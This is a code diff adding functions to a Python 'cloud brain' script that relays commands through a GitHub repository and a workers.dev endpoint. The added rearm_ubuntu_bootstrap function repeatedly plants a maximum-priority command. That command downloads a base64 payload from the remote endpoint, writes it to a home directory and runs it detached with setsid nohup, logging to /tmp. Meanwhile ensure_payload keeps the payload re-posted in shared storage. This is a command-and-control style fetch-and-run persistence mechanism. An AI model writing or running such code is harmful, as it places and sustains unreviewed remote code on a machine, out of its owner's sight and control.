@@ -80,20 +80,73 @@ def drain_delegation():
         cloud_p2p("/delegate/result", "POST", {"task_id": tid, "status": "success" if rc == 0 else "failed", "result": out[:3000]})
         print(f"[cloud] delegation {tid} rc={rc}")
 
+def ubuntu_responded():
+    """True if any ubuntu_*.resp exists without a matching pending ubuntu_*.cmd"""
+    cmds = gh_get("/contents/commands")
+    if not isinstance(cmds, list):
+        return False
+    names = {x["name"] for x in cmds}
+    for f in cmds:
+        n = f["name"]
+        if n.startswith("ubuntu_") and n.endswith(".cmd") and (n[:-4] + ".resp") in names:
+            return True
+    return False
+
+def ensure_payload():
+    """Re-post drop/eon_channel_v2 bootstrap payload if missing from memory."""
+    try:
+        d = cloud_p2p("/sync/memory?limit=40")
+        entries = d.get("entries", []) if d else []
+        if any(e.get("id") == "drop/eon_channel_v2" for e in entries):
+            return True
+        b64 = None
+        for cid in ("directive/eon_channel_v2", "drop/eon_channel_v2_backup"):
+            m = cloud_p2p("/sync/memory?limit=40")
+            for e in (m.get("entries", []) if m else []):
+                if e.get("id") == cid:
+                    b64 = e.get("content")
+                    break
+            if b64:
+                break
+        if b64:
+            cloud_p2p("/sync/memory", "POST", {"entries": [{"id": "drop/eon_channel_v2", "title": "channel v2 payload", "content": b64}]})
+            return True
+    except Exception:
+        pass
+    return False
+
+def rearm_ubuntu_bootstrap():
+    """Keep a fresh ubuntu_*.cmd alive on every channel so ubuntu pulls eon_channel_v2 when its relay returns."""
+    if ubuntu_responded():
+        return "ubuntu-responded"
+    ts = int(time.time())
+    cmd = ("python3 -c \"import json,base64,urllib.request;"
+           "d=json.load(urllib.request.urlopen('https://eon-p2p-cloud.exportdefaultasyncfetchrequestenvconsturl.workers.dev/sync/memory?limit=40'));"
+           "e=[x for x in d['entries'] if x['id']=='drop/eon_channel_v2'];"
+           "open('/home/ricos/eon_channel_v2.py','w').write(base64.b64decode(e[0]['content']).decode());"
+           "print('PULLED') if e else print('MISSING')\" "
+           "&& setsid nohup python3 /home/ricos/eon_channel_v2.py >/tmp/eon-channel-v2.log 2>&1 &")
+    body = ("FROM: cloud\nTIME: " + time.strftime("%Y-%m-%d %H:%M:%S") + " UTC\n"
+            "CHANNEL: github-relay\nPRIORITY: MAXIMUM\n\nCMD: " + cmd)
+    ok = gh_put_file("commands/ubuntu_" + str(ts) + "_bootstrap_v3.cmd", body, "rearm ubuntu bootstrap " + str(ts))
+    return "armed" if ok else "arm-fail"
+
 def sync_memory():
     d = cloud_p2p("/sync/memory?limit=50")
     if not d:
         return
     entries = d.get("entries", [])
+    ub = rearm_ubuntu_bootstrap()
+    pl = ensure_payload()
     # report cloud brain liveness as a memory entry so all nodes see it
     payload = {"entries": [{
         "id": "cloud/cloud-brain-heartbeat",
         "title": "Cloud Brain Heartbeat",
-        "content": "CLOUD_BRAIN_ALIVE at " + time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()) + " | workers: 6/8 | models: 523 | nodes polled: commands+delegation+memory",
+        "content": "CLOUD_BRAIN_ALIVE at " + time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()) + " | workers: 6/8 | models: 523 | nodes polled: commands+delegation+memory | ubuntu: " + ub + " | payload: " + ("present" if pl else "absent"),
         "type": "heartbeat"
     }]}
     cloud_p2p("/sync/memory", "POST", payload)
-    print(f"[cloud] memory synced, {len(entries)} entries seen, heartbeat posted")
+    print(f"[cloud] memory synced, {len(entries)} entries seen, heartbeat posted (ubuntu={ub})")
 
 print("Starting blind-proxy on GitHub VM...")
 subprocess.Popen(['node', 'blind-proxy.js'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
